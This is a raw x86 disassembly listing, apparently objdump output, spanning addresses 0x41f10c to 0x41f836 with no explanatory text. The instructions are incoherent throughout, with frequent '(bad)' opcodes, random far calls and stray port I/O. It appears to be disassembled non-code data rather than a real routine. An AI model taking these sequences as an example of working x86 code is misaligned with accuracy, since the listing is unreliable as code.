  41f10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f10d:	mov    al,ds:0xaf2aeb9a
  41f112:	add    al,0x0
  41f114:	loopne 0x41f186
  41f116:	out    dx,eax
  41f117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f118:	jnp    0x41f138
  41f11a:	dec    ebp
  41f11b:	adc    DWORD PTR [ecx],0x6e
  41f11e:	sub    al,0xda
  41f120:	mov    al,0xb1
  41f122:	aam    0x47
  41f124:	mov    DWORD PTR [eax],ebx
  41f126:	in     al,0xe7
  41f128:	arpl   WORD PTR ds:0x24ba796,ax
  41f12e:	xchg   BYTE PTR [ebx],ch
  41f130:	popf   
  41f131:	xchg   ebp,eax
  41f132:	add    DWORD PTR [ebx-0x4e],edx
  41f135:	xchg   ecx,eax
  41f136:	stc    
  41f137:	inc    edx
  41f138:	mov    ecx,0x814651d2
  41f13d:	mov    ebx,0x4245a762
  41f142:	sub    dl,bl
  41f144:	cmc    
  41f145:	xchg   BYTE PTR [edx-0x16],dh
  41f148:	mov    bl,0xd9
  41f14a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14b:	mov    cl,0xf1
  41f14d:	scas   al,BYTE PTR es:[edi]
  41f14e:	adc    esp,ebx
  41f150:	repnz (bad) 
  41f152:	mov    BYTE PTR [ecx],bl
  41f154:	xor    cl,BYTE PTR [esi]
  41f156:	leave  
  41f157:	push   ebp
  41f158:	push   ds
  41f159:	repnz clc 
  41f15b:	addr16 dec eax
  41f15d:	jnp    0x41f0f3
  41f15f:	in     eax,dx
  41f160:	mov    dl,0x90
  41f162:	pop    ebp
  41f163:	xchg   cl,bl
  41f165:	sbb    esp,ebx
  41f167:	inc    eax
  41f168:	iret   
  41f169:	or     al,BYTE PTR [edi]
  41f16b:	bound  edx,QWORD PTR [edx+eiz*4]
  41f16e:	pop    ecx
  41f16f:	stc    
  41f170:	xor    eax,edi
  41f172:	push   esp
  41f173:	repz mov dl,0x29
  41f176:	stos   BYTE PTR es:[edi],al
  41f177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f178:	fstp   TBYTE PTR [esp+ebp*1]
  41f17b:	and    bh,ah
  41f17d:	or     eax,DWORD PTR [ecx-0x5f]
  41f180:	and    DWORD PTR [eax],eax
  41f182:	(bad)  
  41f183:	cmp    ecx,DWORD PTR [esi-0x5e]
  41f186:	call   0xd432:0xa71d3005
  41f18d:	or     al,0xb1
  41f18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f190:	mov    ds:0xa9f70132,eax
  41f195:	idiv   cl
  41f197:	mov    edi,0x639e2db1
  41f19c:	ins    DWORD PTR es:[edi],dx
  41f19d:	jnp    0x41f130
  41f19f:	cs pop esi
  41f1a1:	mov    bl,0xea
  41f1a3:	sti    
  41f1a4:	and    al,0xb
  41f1a6:	je     0x41f190
  41f1a8:	pop    ebx
  41f1a9:	test   BYTE PTR [edx],bh
  41f1ab:	mov    DWORD PTR [eax-0x51454967],esp
  41f1b1:	inc    edx
  41f1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1b4:	es cmc 
  41f1b6:	sub    DWORD PTR [edx],eax
  41f1b8:	cmc    
  41f1b9:	and    ch,BYTE PTR [edi+0x5d]
  41f1bc:	mov    ah,0xb
  41f1be:	scas   eax,DWORD PTR es:[edi]
  41f1bf:	push   ecx
  41f1c0:	cmp    al,0xbc
  41f1c2:	fcom   QWORD PTR [edx]
  41f1c4:	in     eax,dx
  41f1c5:	or     al,0x9a
  41f1c7:	add    DWORD PTR [eax-0x3c4b5182],ecx
  41f1cd:	push   cs
  41f1ce:	leave  
  41f1cf:	mov    al,ds:0x95dd3895
  41f1d4:	stos   BYTE PTR es:[edi],al
  41f1d5:	or     ecx,DWORD PTR [ebp-0x582ac712]
  41f1db:	out    0xd6,al
  41f1dd:	repnz call 0xad45:0xa3bd5d19
  41f1e5:	(bad)  
  41f1e6:	xlat   BYTE PTR ds:[ebx]
  41f1e7:	fdivr  DWORD PTR [ebx+ecx*1]
  41f1ea:	in     eax,dx
  41f1eb:	or     edx,DWORD PTR [ebp+0x22708980]
  41f1f1:	gs call 0xd61c:0x8d4a1165
  41f1f9:	add    BYTE PTR [ebx],cl
  41f1fb:	pop    ecx
  41f1fc:	mov    DWORD PTR [ebx],ecx
  41f1fe:	cmp    al,0x29
  41f200:	sbb    ah,BYTE PTR [esi-0x2a9ce84b]
  41f206:	cdq    
  41f207:	sbb    DWORD PTR [esi-0x57b08699],ebp
  41f20d:	ret    
  41f20e:	jecxz  0x41f278
  41f210:	std    
  41f211:	add    ch,al
  41f213:	test   DWORD PTR [esi],0x2d781aa3
  41f219:	das    
  41f21a:	dec    ebx
  41f21b:	pop    edx
  41f21c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f21d:	mov    eax,ds:0x9cb2c731
  41f222:	fldl2t 
  41f224:	add    cl,dl
  41f226:	mov    bh,0xa4
  41f228:	dec    edx
  41f229:	ret    0x1c4a
  41f22c:	retf   
  41f22d:	and    dh,BYTE PTR [edx]
  41f22f:	sub    BYTE PTR [ecx-0x31],ah
  41f232:	call   0xcfe:0xc6668546
  41f239:	dec    edi
  41f23a:	xchg   esi,eax
  41f23b:	test   eax,0x395c7b67
  41f240:	repnz (bad) 
  41f242:	fucom  st(2)
  41f244:	add    al,0x79
  41f246:	call   0x5830:0x6118d435
  41f24d:	fistp  WORD PTR [ebx]
  41f24f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f250:	pop    es
  41f251:	sub    dl,dh
  41f253:	imul   esi,DWORD PTR [edi],0xb2af7dbb
  41f259:	mov    ch,0x8c
  41f25b:	pop    ds
  41f25c:	xchg   edi,eax
  41f25d:	cmp    bh,bl
  41f25f:	jg     0x41f292
  41f261:	add    eax,0xe64f2a30
  41f266:	cmp    bl,al
  41f268:	int3   
  41f269:	mov    edi,0xebb27a7f
  41f26e:	adc    ebp,DWORD PTR [esi-0x79]
  41f271:	hlt    
  41f272:	inc    edx
  41f273:	mov    bl,0xc7
  41f275:	or     edi,DWORD PTR [ebx+0x44c62608]
  41f27b:	popa   
  41f27c:	mov    esp,0x90579adb
  41f281:	test   DWORD PTR [edi+ebp*4-0x58c63c93],esi
  41f288:	cmp    bl,BYTE PTR [ecx+0x2af14175]
  41f28e:	repnz dec esp
  41f290:	mov    bl,0xb8
  41f292:	jb     0x41f2fc
  41f294:	add    ch,BYTE PTR [ecx-0x72]
  41f297:	ror    DWORD PTR [edx-0x68],1
  41f29a:	je     0x41f27b
  41f29c:	inc    ebp
  41f29d:	jno    0x41f301
  41f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2a0:	mov    bh,0x31
  41f2a2:	jmp    0x41f31c
  41f2a4:	daa    
  41f2a5:	jns    0x41f2c3
  41f2a7:	pop    esi
  41f2a8:	mov    dl,0xba
  41f2aa:	out    dx,eax
  41f2ab:	add    BYTE PTR ds:0xc6526b99,bl
  41f2b1:	inc    edi
  41f2b2:	aaa    
  41f2b3:	jecxz  0x41f265
  41f2b5:	fdiv   QWORD PTR [ebp+0x1b70bbc6]
  41f2bb:	pop    edx
  41f2bc:	jmp    0x41f2fa
  41f2be:	mov    dh,0x5b
  41f2c0:	add    esp,esi
  41f2c2:	mov    ds:0xf68b177f,eax
  41f2c7:	outs   dx,BYTE PTR ds:[esi]
  41f2c8:	imul   eax,DWORD PTR [ebx+0x5a160e7],0x37
  41f2cf:	dec    edi
  41f2d0:	call   0x3825:0x3de09ad4
  41f2d7:	adc    eax,0x80cbd8b1
  41f2dc:	mov    al,0xf8
  41f2de:	dec    edi
  41f2df:	pop    ss
  41f2e0:	not    dl
  41f2e2:	jno    0x41f2eb
  41f2e4:	inc    ebp
  41f2e5:	sbb    dh,ch
  41f2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e8:	jne    0x41f369
  41f2ea:	xchg   edx,eax
  41f2eb:	sti    
  41f2ec:	pop    ebx
  41f2ed:	(bad)  
  41f2ee:	ds dec ecx
  41f2f0:	mov    dl,0xff
  41f2f2:	sub    BYTE PTR [ebx],0xb4
  41f2f5:	xchg   esp,eax
  41f2f6:	xchg   ebp,eax
  41f2f7:	out    0x43,al
  41f2f9:	and    edi,eax
  41f2fb:	xor    DWORD PTR [ebx+0xb],esp
  41f2fe:	jmp    0x559e:0xfce59098
  41f305:	mov    esp,0x57eded9a
  41f30a:	aam    0xdc
  41f30c:	pushf  
  41f30d:	lods   al,BYTE PTR ds:[esi]
  41f30e:	jl     0x41f2c8
  41f310:	pop    di
  41f312:	data16 xor al,0x9
  41f315:	or     ebp,DWORD PTR [ebp+0x22bda64e]
  41f31b:	jg     0x41f2cf
  41f31d:	rcr    al,cl
  41f31f:	cmp    bh,BYTE PTR [eax]
  41f321:	retf   
  41f322:	test   al,0x90
  41f324:	pop    esp
  41f325:	or     al,0x88
  41f327:	(bad)  
  41f328:	add    ch,BYTE PTR [edx+0x3284a7e6]
  41f32e:	fisttp QWORD PTR [edx-0x4e]
  41f331:	outs   dx,BYTE PTR ds:[esi]
  41f332:	pop    ds
  41f333:	ins    BYTE PTR es:[edi],dx
  41f334:	mov    bl,0xb4
  41f336:	jae    0x41f2bd
  41f338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f339:	or     esi,DWORD PTR [ebx]
  41f33b:	xor    eax,0x23b3c768
  41f340:	test   dh,bh
  41f342:	call   0x4a28:0xb5e4941b
  41f349:	cs out 0xb0,al
  41f34c:	adc    al,BYTE PTR [eax+0x77]
  41f34f:	dec    ebx
  41f350:	dec    edi
  41f351:	adc    al,0xe8
  41f353:	in     al,0x77
  41f355:	mov    dh,0xf6
  41f357:	ins    BYTE PTR es:[edi],dx
  41f358:	xor    al,ch
  41f35a:	out    dx,eax
  41f35b:	xor    ax,0xe60b
  41f35f:	bound  eax,QWORD PTR [ebp+0x7e65202]
  41f365:	inc    ecx
  41f366:	cdq    
  41f367:	pop    edx
  41f368:	xchg   edx,eax
  41f369:	xor    eax,ebp
  41f36b:	in     eax,0xd
  41f36d:	add    eax,0xb9bab266
  41f372:	mov    cl,0x5b
  41f374:	xor    eax,0x32244be1
  41f379:	clc    
  41f37a:	inc    edx
  41f37b:	ficom  DWORD PTR [ecx+eiz*4-0x5a36e166]
  41f382:	hlt    
  41f383:	push   0xffffffa8
  41f385:	int3   
  41f386:	mov    esp,DWORD PTR [edi-0x1d5cbe74]
  41f38c:	and    bl,BYTE PTR [ecx-0x27]
  41f38f:	xchg   esi,eax
  41f390:	mov    ebx,0x41101b09
  41f395:	or     ebx,edi
  41f397:	xchg   ebx,eax
  41f398:	sbb    al,0xaf
  41f39a:	mov    al,ds:0x19d481a7
  41f39f:	scas   al,BYTE PTR es:[edi]
  41f3a0:	rep lods al,BYTE PTR ds:[esi]
  41f3a2:	or     dh,BYTE PTR [eax+0x1a8e9f2a]
  41f3a8:	cdq    
  41f3a9:	addr16 jp 0x41f353
  41f3ac:	jno    0x41f405
  41f3ae:	cli    
  41f3af:	lds    edx,FWORD PTR [ebx+0x56]
  41f3b2:	xor    BYTE PTR [eax+0x59b8c31],bl
  41f3b8:	sbb    eax,0xa87a14af
  41f3bd:	jecxz  0x41f377
  41f3bf:	fdiv   QWORD PTR [ebx-0x56cd429e]
  41f3c5:	pop    edi
  41f3c6:	mul    BYTE PTR [ebx]
  41f3c8:	inc    esi
  41f3c9:	cmp    eax,0xf1fafb1d
  41f3ce:	call   0x2342:0xb296c056
  41f3d5:	and    BYTE PTR [edx+0x68e3e72f],bl
  41f3db:	mov    eax,DWORD PTR [eax]
  41f3dd:	jg     0x41f3d8
  41f3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3e0:	lahf   
  41f3e1:	sbb    eax,0xdcc841c1
  41f3e7:	xor    eax,0x40ccd5b2
  41f3ec:	gs xchg ebx,eax
  41f3ee:	daa    
  41f3ef:	xor    ah,ch
  41f3f1:	or     BYTE PTR [ecx+0x4e79af2e],ch
  41f3f7:	and    eax,0xe3bc052a
  41f3fc:	dec    esi
  41f3fd:	add    BYTE PTR [ebx+0x2aee55b9],bl
  41f403:	(bad)  
  41f404:	pop    esp
  41f405:	pop    eax
  41f406:	pop    esi
  41f407:	bound  ebx,QWORD PTR [eax]
  41f409:	adc    DWORD PTR ss:[edi-0x4e],eax
  41f40d:	js     0x41f443
  41f40f:	jns    0x41f42a
  41f411:	sahf   
  41f412:	mov    BYTE PTR [eax-0x4e],ah
  41f415:	sub    bl,ah
  41f417:	pop    edi
  41f418:	clc    
  41f419:	scas   al,BYTE PTR es:[edi]
  41f41a:	sbb    DWORD PTR [eax],eax
  41f41c:	sbb    DWORD PTR ds:0xb8b8ab5,0xee68aa0e
  41f426:	(bad)  
  41f427:	popa   
  41f428:	mov    al,ds:0xb2b04fcc
  41f42d:	jne    0x41f471
  41f42f:	repnz mov ss,WORD PTR [eax]
  41f432:	in     al,0x81
  41f434:	int    0x83
  41f436:	sbb    BYTE PTR [eax-0x8cd3095],ah
  41f43c:	mov    eax,DWORD PTR [edx]
  41f43e:	lds    ebp,FWORD PTR [esp+edx*4]
  41f441:	pop    eax
  41f442:	mov    edi,0x40c9b318
  41f447:	add    DWORD PTR [ecx],edx
  41f449:	xchg   esp,eax
  41f44a:	data16 int3 
  41f44c:	push   ebx
  41f44d:	or     ebx,DWORD PTR [ecx+0x2cb285c6]
  41f453:	xor    al,0xe1
  41f455:	ins    BYTE PTR es:[edi],dx
  41f456:	xchg   cl,cl
  41f458:	out    dx,al
  41f459:	and    BYTE PTR [esi+ecx*1],dl
  41f45c:	inc    esp
  41f45d:	jmp    0x41f431
  41f45f:	sub    DWORD PTR [edi-0x56],0x1e8aa7d1
  41f466:	mov    ch,0x8
  41f468:	cwde   
  41f469:	outs   dx,DWORD PTR ds:[esi]
  41f46a:	and    al,bh
  41f46c:	mov    dl,0x27
  41f46e:	pop    edi
  41f46f:	adc    eax,0x45071ac2
  41f474:	out    0xed,al
  41f476:	jle    0x41f425
  41f478:	xor    al,ch
  41f47a:	in     eax,0x4b
  41f47c:	or     ecx,DWORD PTR [bp+si+0x79]
  41f480:	leave  
  41f481:	fdiv   DWORD PTR [edi]
  41f483:	pop    ds
  41f484:	mov    dl,0xd9
  41f486:	iret   
  41f487:	pusha  
  41f488:	repnz fnstsw WORD PTR [ebx+0x65059a9c]
  41f48f:	or     eax,0xf95aad23
  41f494:	je     0x41f504
  41f496:	xchg   esp,eax
  41f497:	cmp    eax,0xa531aab2
  41f49c:	leave  
  41f49d:	in     eax,0xb1
  41f49f:	ins    BYTE PTR es:[edi],dx
  41f4a0:	scas   al,BYTE PTR es:[edi]
  41f4a1:	or     edx,edx
  41f4a3:	mov    ah,cl
  41f4a5:	mov    cl,0xd6
  41f4a7:	inc    ecx
  41f4a8:	cs int 0x6c
  41f4ab:	dec    edx
  41f4ac:	mov    dl,0x44
  41f4ae:	in     al,dx
  41f4af:	jae    0x41f4ce
  41f4b1:	aam    0x21
  41f4b3:	add    eax,0xc64aabff
  41f4b8:	cmp    BYTE PTR [ebx],cl
  41f4ba:	push   eax
  41f4bb:	jno    0x41f4e0
  41f4bd:	dec    edi
  41f4be:	(bad)  
  41f4c0:	sbb    al,0xd7
  41f4c2:	call   0x8e24:0xe04a59c5
  41f4c9:	push   esi
  41f4ca:	retf   0x70a3
  41f4cd:	inc    eax
  41f4ce:	inc    ecx
  41f4cf:	dec    ebp
  41f4d0:	nop
  41f4d1:	mov    ?,WORD PTR [edx]
  41f4d3:	daa    
  41f4d4:	push   esi
  41f4d5:	xor    BYTE PTR [edx+0x42],al
  41f4d8:	push   esi
  41f4d9:	jl     0x41f475
  41f4db:	and    eax,0x8e1d27dc
  41f4e0:	aam    0xb6
  41f4e2:	sub    ah,BYTE PTR [edi+0x33b41f82]
  41f4e8:	repnz or ch,cl
  41f4eb:	je     0x41f4bb
  41f4ed:	mov    esp,0xc3f6779a
  41f4f2:	repnz inc ebx
  41f4f4:	adc    bl,dl
  41f4f6:	add    BYTE PTR [edi-0x73c32df1],ah
  41f4fc:	fcomp  QWORD PTR [eax+esi*4-0x3]
  41f500:	mov    dl,0xc9
  41f502:	xor    al,0x9c
  41f504:	lods   al,BYTE PTR ds:[esi]
  41f505:	xchg   esi,eax
  41f506:	stos   DWORD PTR es:[edi],eax
  41f507:	inc    ecx
  41f508:	scas   al,BYTE PTR es:[edi]
  41f509:	or     ecx,DWORD PTR [edx]
  41f50b:	int3   
  41f50c:	jecxz  0x41f4f8
  41f50e:	imul   eax
  41f510:	jno    0x41f536
  41f512:	call   0x3e38:0xd0b24b8b
  41f519:	cmp    al,0x4a
  41f51b:	mov    ecx,0x66253376
  41f520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f521:	aaa    
  41f522:	(bad)  
  41f523:	mov    ch,0xdd
  41f525:	ret    
  41f526:	sub    bl,BYTE PTR [esi-0x4e]
  41f529:	sub    bh,BYTE PTR [esi]
  41f52b:	xor    ch,cl
  41f52d:	mov    ds:0xb21b6f3,eax
  41f532:	fiadd  WORD PTR [ecx+0x7359a60d]
  41f538:	out    dx,al
  41f539:	pop    ebx
  41f53a:	call   0x4f52:0x1c7b54f1
  41f541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f542:	retf   
  41f543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f544:	inc    ebp
  41f545:	sbb    al,BYTE PTR [ecx-0x65]
  41f548:	mov    al,ds:0xc2cf425f
  41f54d:	popa   
  41f54e:	call   0xe2b9:0x1969a880
  41f555:	imul   eax,esp,0xffffffa0
  41f558:	clc    
  41f559:	pop    ebp
  41f55a:	loop   0x41f56a
  41f55c:	hlt    
  41f55d:	mov    edi,DWORD PTR [esi]
  41f55f:	shl    DWORD PTR [edx+edi*8-0x6c],cl
  41f563:	lea    ebp,[esi+0x3b679086]
  41f569:	int    0xac
  41f56b:	xchg   ebx,eax
  41f56c:	pop    edi
  41f56d:	or     ebp,DWORD PTR [eax+0x49bb209d]
  41f573:	push   ebx
  41f574:	jne    0x41f5b9
  41f576:	test   BYTE PTR [esi-0x23a56dc4],cl
  41f57c:	pop    eax
  41f57d:	je     0x41f521
  41f57f:	cmp    DWORD PTR [edx-0x6cdc0cf5],esp
  41f585:	or     ecx,0xa78a18ea
  41f58b:	xchg   ecx,eax
  41f58c:	cli    
  41f58d:	mov    bl,BYTE PTR [esi+ebx*2+0x4b2e03ea]
  41f594:	inc    edx
  41f595:	push   esp
  41f596:	xor    eax,0x331d2da7
  41f59b:	outs   dx,BYTE PTR ds:[esi]
  41f59c:	ds into 
  41f59e:	inc    esp
  41f59f:	inc    esp
  41f5a0:	mov    dl,0x9b
  41f5a2:	out    0xd7,eax
  41f5a4:	xchg   ebx,eax
  41f5a5:	and    dl,ch
  41f5a7:	test   dh,ah
  41f5a9:	or     eax,DWORD PTR [eax]
  41f5ab:	out    dx,al
  41f5ac:	pop    es
  41f5ad:	sar    ebp,1
  41f5af:	or     DWORD PTR [ebx],esi
  41f5b1:	rcr    BYTE PTR [edx-0x612aaa03],cl
  41f5b7:	gs (bad) 
  41f5b9:	mov    WORD PTR [edx-0x65a12e11],?
  41f5bf:	push   ds
  41f5c0:	test   DWORD PTR [esi+0x601cdafe],ebp
  41f5c6:	xchg   esp,eax
  41f5c7:	sbb    bl,bl
  41f5c9:	push   edx
  41f5ca:	outs   dx,DWORD PTR ds:[esi]
  41f5cb:	daa    
  41f5cc:	mov    bl,0x2f
  41f5ce:	scas   eax,DWORD PTR es:[edi]
  41f5cf:	pop    ecx
  41f5d0:	mov    BYTE PTR [ebx],cl
  41f5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5d3:	cmc    
  41f5d4:	and    ch,BYTE PTR [ebx]
  41f5d6:	xchg   ecx,eax
  41f5d7:	sbb    BYTE PTR [ebx+esi*1-0x66],ch
  41f5db:	push   eax
  41f5dc:	dec    ebp
  41f5dd:	jnp    0x41f617
  41f5df:	add    DWORD PTR [edi],edx
  41f5e1:	lea    edx,[edx-0x59]
  41f5e4:	sbb    esi,ebx
  41f5e6:	ret    0x81ef
  41f5e9:	cwde   
  41f5ea:	icebp  
  41f5eb:	mov    al,0xb2
  41f5ed:	not    DWORD PTR [ebp+ebx*4-0x60]
  41f5f1:	xchg   DWORD PTR [esi+ecx*2+0x31],ebx
  41f5f5:	or     edi,ebp
  41f5f7:	push   ds
  41f5f8:	jns    0x41f5d9
  41f5fa:	popf   
  41f5fb:	stos   BYTE PTR es:[edi],al
  41f5fc:	xor    dl,ch
  41f5fe:	call   0xbb20:0x253c94c2
  41f605:	jg     0x41f67b
  41f607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f608:	sbb    esp,esi
  41f60a:	outs   dx,DWORD PTR ds:[esi]
  41f60b:	loop   0x41f5e1
  41f60d:	add    BYTE PTR [esi+0x2c],dl
  41f610:	mov    ch,0xa3
  41f612:	cmp    esi,DWORD PTR [ecx+0x48]
  41f615:	lods   eax,DWORD PTR ds:[esi]
  41f616:	cmp    ah,BYTE PTR [ecx]
  41f618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f619:	or     eax,0x6dda73f
  41f61e:	or     DWORD PTR [eax],ebx
  41f620:	pop    ebp
  41f621:	pop    ebp
  41f622:	inc    esi
  41f623:	jl     0x41f623
  41f625:	in     eax,0x5c
  41f627:	mov    al,ds:0xa0772487
  41f62c:	ret    0x15f4
  41f62f:	loopne 0x41f64a
  41f631:	or     esi,DWORD PTR [ebx+0x19]
  41f634:	xchg   edx,eax
  41f635:	(bad)  [eax]
  41f637:	and    BYTE PTR [ecx-0x29627b86],dh
  41f63d:	sub    eax,0x193f5c5b
  41f642:	sub    eax,0x2fe9768c
  41f647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f648:	sti    
  41f649:	cmp    BYTE PTR [ecx-0x5f],dl
  41f64c:	inc    eax
  41f64d:	pop    edi
  41f64e:	lods   al,BYTE PTR es:[esi]
  41f650:	mov    bl,0xa3
  41f652:	aad    0x8a
  41f654:	jo     0x41f63e
  41f656:	jmp    0x16a3:0x80f2629f
  41f65d:	push   ebp
  41f65e:	adc    edx,DWORD PTR [ebp-0x39d474db]
  41f664:	xchg   edi,eax
  41f665:	or     bl,BYTE PTR [ecx-0x3f283a58]
  41f66b:	add    eax,0xf66adbbf
  41f670:	fist   WORD PTR [edx+eiz*8]
  41f673:	jg     0x41f6ed
  41f675:	dec    ebx
  41f676:	mov    ss,WORD PTR ds:0x9df3915c
  41f67c:	scas   al,BYTE PTR es:[edi]
  41f67d:	iret   
  41f67e:	or     BYTE PTR [edi-0x76e5b6ce],bh
  41f684:	je     0x41f67c
  41f686:	shl    DWORD PTR [ebp-0x5c151dbc],1
  41f68c:	xlat   BYTE PTR ds:[ebx]
  41f68d:	dec    edx
  41f68e:	icebp  
  41f68f:	jecxz  0x41f6bb
  41f691:	xor    esp,ebx
  41f693:	mov    esi,0x5927c4b4
  41f698:	outs   dx,DWORD PTR ds:[esi]
  41f699:	shl    esi,0xa7
  41f69c:	adc    ebx,0x7c
  41f69f:	popf   
  41f6a0:	xchg   esi,eax
  41f6a1:	imul   ebp,DWORD PTR [esi],0xffffff91
  41f6a4:	mov    dl,0x71
  41f6a6:	js     0x41f674
  41f6a8:	gs in  al,dx
  41f6aa:	pop    esp
  41f6ab:	stc    
  41f6ac:	pop    esp
  41f6ad:	or     ebx,DWORD PTR [edi-0x51c1994e]
  41f6b3:	xchg   edi,eax
  41f6b4:	xchg   esp,eax
  41f6b5:	pop    esp
  41f6b6:	call   0x3e5f:0x3d9593e5
  41f6bd:	(bad)  
  41f6be:	cmp    bl,BYTE PTR [esi+0x171d1546]
  41f6c4:	mov    DWORD PTR [ecx],esi
  41f6c6:	bswap  eax
  41f6c8:	push   edx
  41f6c9:	(bad)  
  41f6ca:	adc    DWORD PTR [ecx],edi
  41f6cc:	mov    ebp,0x20509d47
  41f6d1:	pushf  
  41f6d2:	xor    eax,0xdf8ea274
  41f6d7:	mov    ds,ebp
  41f6d9:	or     eax,DWORD PTR [ebx]
  41f6db:	jmp    0x7f0e:0x27e9a817
  41f6e2:	call   0x6728:0x5b9b5ded
  41f6e9:	in     eax,dx
  41f6ea:	shl    DWORD PTR [edi+0x10272fdd],cl
  41f6f0:	(bad)
  41f6f3:	jp     0x41f6a7
  41f6f5:	les    edx,FWORD PTR [eax]
  41f6f7:	mov    al,0xd9
  41f6f9:	jecxz  0x41f685
  41f6fb:	aam    0x7a
  41f6fd:	or     eax,edi
  41f6ff:	retf   0xfbe6
  41f702:	pop    esp
  41f703:	push   ebp
  41f704:	(bad)  
  41f705:	sub    DWORD PTR [ebp+0x1134ad66],ebx
  41f70b:	push   DWORD PTR [ebp+0x40]
  41f70e:	jnp    0x41f72c
  41f710:	sahf   
  41f711:	or     DWORD PTR [edx+0x12],eax
  41f714:	int    0x7d
  41f716:	add    al,0xa7
  41f718:	shl    DWORD PTR [eax-0x34793ac6],0x24
  41f71f:	mov    edi,0x59174eb2
  41f724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f725:	pop    eax
  41f726:	outs   dx,BYTE PTR ds:[esi]
  41f727:	(bad)  
  41f728:	mov    eax,0x1d6dcf0b
  41f72d:	ja     0x41f765
  41f72f:	push   edi
  41f730:	and    DWORD PTR [edx],esp
  41f732:	call   0x3546:0x86eb1826
  41f739:	cmp    BYTE PTR [edi],0xa7
  41f73c:	in     al,0x4c
  41f73e:	lea    esi,[ebx]
  41f740:	push   DWORD PTR [ecx+0x55b20ac1]
  41f746:	aad    0xf0
  41f748:	pop    ecx
  41f749:	adc    ch,ch
  41f74b:	fld    QWORD PTR [ecx]
  41f74d:	mov    bl,0x5c
  41f74f:	inc    ebx
  41f750:	cmp    BYTE PTR [ebx],cl
  41f752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f753:	inc    ebx
  41f754:	push   edi
  41f755:	shl    BYTE PTR [edx-0x17],1
  41f758:	repz jecxz 0x41f6f8
  41f75b:	or     ecx,ebx
  41f75d:	dec    ebx
  41f75e:	or     BYTE PTR [ebp-0x3e],ah
  41f761:	adc    eax,0xb868294
  41f766:	adc    DWORD PTR [esi-0x15ab14d7],ecx
  41f76c:	aad    0x9d
  41f76e:	mov    esi,0x9a0cfbf4
  41f773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f774:	ret    0x9cc6
  41f777:	jg     0x41f789
  41f779:	or     ecx,DWORD PTR [edi+0x4d]
  41f77c:	ss popa 
  41f77e:	test   DWORD PTR [edx+0x6e],0x290a99ad
  41f785:	std    
  41f786:	push   cs
  41f787:	loop   0x41f7b4
  41f789:	xchg   ebx,eax
  41f78a:	mov    bh,0x70
  41f78c:	or     edx,DWORD PTR fs:[esi+0x5f75e34]
  41f793:	mov    eax,ds:0x769461c1
  41f798:	xor    eax,0x4f4710a5
  41f79d:	iret   
  41f79e:	push   esp
  41f79f:	push   esp
  41f7a0:	add    ecx,DWORD PTR [ebx]
  41f7a2:	jmp    0x41f78d
  41f7a4:	mov    esi,esp
  41f7a6:	rol    DWORD PTR [edx],cl
  41f7a8:	leave  
  41f7a9:	cs push 0xe972890a
  41f7af:	daa    
  41f7b0:	(bad)  
  41f7b1:	loope  0x41f76c
  41f7b3:	push   edx
  41f7b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b5:	sub    al,0xaf
  41f7b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b8:	cmp    BYTE PTR [edx],bl
  41f7ba:	ror    BYTE PTR [esi+0x195f88df],1
  41f7c0:	mov    dl,0xd2
  41f7c2:	lods   eax,DWORD PTR ds:[esi]
  41f7c3:	pop    ss
  41f7c4:	aam    0xcf
  41f7c6:	sbb    ebx,DWORD PTR [ebx+0x23ea0b04]
  41f7cc:	inc    esp
  41f7cd:	je     0x41f761
  41f7cf:	mov    ds:0xb09f3221,al
  41f7d4:	jb     0x41f7c7
  41f7d6:	bound  ebp,QWORD PTR [eax-0x452eb08e]
  41f7dc:	test   BYTE PTR [ebx],cl
  41f7de:	call   FWORD PTR [esi-0x25]
  41f7e1:	int    0x89
  41f7e3:	jne    0x41f7c4
  41f7e5:	sub    bl,BYTE PTR [edx-0x646de262]
  41f7eb:	fld    st(5)
  41f7ed:	(bad)  
  41f7ee:	mov    ds:0x77f0b4a7,al
  41f7f3:	call   0x44cb:0x82025931
  41f7fa:	in     eax,0x16
  41f7fc:	mov    dl,0xdd
  41f7fe:	xor    BYTE PTR [ecx],dl
  41f800:	adc    eax,0x8a4de9d6
  41f805:	jb     0x41f7a6
  41f807:	popf   
  41f808:	mov    dh,0xc0
  41f80a:	cli    
  41f80b:	mov    ch,0xc0
  41f80d:	retf   0x9b98
  41f810:	mov    dl,0xad
  41f812:	cld    
  41f813:	adc    al,0xbe
  41f815:	pop    ebx
  41f816:	enter  0xd5bf,0xa
  41f81a:	cmp    edx,edi
  41f81c:	rcl    BYTE PTR [esi+0x7b],1
  41f81f:	call   DWORD PTR [ecx-0x9]
  41f822:	loop   0x41f7ee
  41f824:	mov    dl,0xa1
  41f826:	cmp    BYTE PTR [ecx],dl
  41f828:	in     eax,0x51
  41f82a:	dec    ebp
  41f82b:	repz dec BYTE PTR [eax]
  41f82e:	adc    eax,0xf08d1c
  41f833:	xchg   ebp,eax
  41f834:	push   0xffffffd6
  41f836:	out    dx,eax
